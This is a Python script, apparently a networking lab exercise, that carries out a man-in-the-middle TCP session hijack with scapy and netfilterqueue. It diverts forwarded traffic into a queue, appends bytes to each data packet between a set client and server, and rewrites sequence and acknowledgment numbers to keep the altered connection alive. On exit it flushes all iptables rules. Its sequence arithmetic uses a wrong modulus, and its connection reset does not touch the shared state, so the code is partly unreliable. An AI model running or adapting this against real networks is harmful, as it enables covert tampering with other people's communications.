from scapy.all import TCP, IP, Raw, send

from netfilterqueue import NetfilterQueue as NFQ
import os

TCP_SYN = 0x02
TCP_FIN = 0x01
TCP_ACK = 0x10
TCP_PSH = 0x08

ip_server = "198.7.0.2"
ip_client = "198.7.0.1"  # router

start_seq = {}
start_seq[ip_server] = 0
start_seq[ip_client] = 0

client = {}
r_client = {}
server = {}
r_server = {}

mesaj = b"123"

MOD = (1 << 32) - 1


def print_details(packet):
    """
    Print the details of the packet
    """
    print(
        packet[IP].src,
        packet[IP].dst,
        " | ",
        packet[TCP].seq - start_seq[packet[IP].src],
        packet[TCP].ack - start_seq[packet[IP].dst],
    )
    # print("Seq: ", packet[TCP].seq, " Ack: ", packet[TCP].ack)
    if packet.haslayer("Raw"):
        print("data: ", packet[Raw].load)


def server_client_connection(packet):
    """
    Filter for the packets that are between the server and the client
    """
    if packet[IP].src == ip_server and packet[IP].dst == ip_client:
        return True
    if packet[IP].src == ip_client and packet[IP].dst == ip_server:
        return True
    return False


def detect_and_alter_packet(packet):
    """
    Detect the packets and alter them
    """
    octets = packet.get_payload()
    scapy_packet = IP(bytes(octets))

    if (
        scapy_packet.haslayer(IP)
        and scapy_packet.haslayer(TCP)
        and server_client_connection(scapy_packet)
    ):
        # New connection, reset the counters
        if scapy_packet[TCP].flags & TCP_SYN:
            client = {}
            r_client = {}
            server = {}
            r_server = {}
            start_seq[scapy_packet[IP].src] = scapy_packet[TCP].seq
        print_details(scapy_packet)

        flags = scapy_packet[TCP].flags
        if scapy_packet.haslayer(Raw) and (flags & TCP_ACK or flags & TCP_PSH):
            scapy_packet = alter_packet(scapy_packet)

            print("CHANGED:")
            print_details(scapy_packet)
            print("----")

    send(scapy_packet)
    packet.drop()


def alter_packet(scapy_packet):
    old_ack = scapy_packet[TCP].ack
    old_seq = scapy_packet[TCP].seq

    # Save the wanted ack number.
    original_ack = (old_seq + len(scapy_packet[Raw].load)) % MOD
    # Alter the packet
    scapy_packet[Raw].load = scapy_packet[Raw].load + mesaj

    if scapy_packet[IP].src == ip_client:
        if old_seq not in r_client:
            r_client[old_seq] = old_seq
            server[old_ack] = old_ack

        # Compute the future ack number
        new_ack = (r_client[old_seq] + len(scapy_packet[Raw].load)) % MOD

        # Update the mappings for the ack numbers
        client[new_ack] = original_ack
        r_client[original_ack] = new_ack

        # Update the packet with the wanted values
        scapy_packet[TCP].seq = r_client[old_seq]
        scapy_packet[TCP].ack = server[old_ack]

    if scapy_packet[IP].src == ip_server:
        if old_seq not in r_server:
            r_server[old_seq] = old_seq
            client[old_ack] = old_ack

        # Compute the future ack number
        new_ack = (r_server[old_seq] + len(scapy_packet[Raw].load)) % MOD

        # Update the mappings for the ack numbers
        server[new_ack] = original_ack
        r_server[original_ack] = new_ack

        # Update the packet with the wanted values
        scapy_packet[TCP].ack = client[old_ack]
        scapy_packet[TCP].seq = r_server[old_seq]

    # Use "del" to let scapy recompute the values
    del scapy_packet[IP].chksum
    del scapy_packet[TCP].chksum
    del scapy_packet[IP].len

    return scapy_packet


queue = NFQ()
try:
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 10")
    # bind trebuie să folosească aceiași coadă ca cea definită în iptables
    queue.bind(10, detect_and_alter_packet)
    print("Running queue")
    queue.run()
except KeyboardInterrupt:
    os.system("iptables --flush")
    queue.unbind()
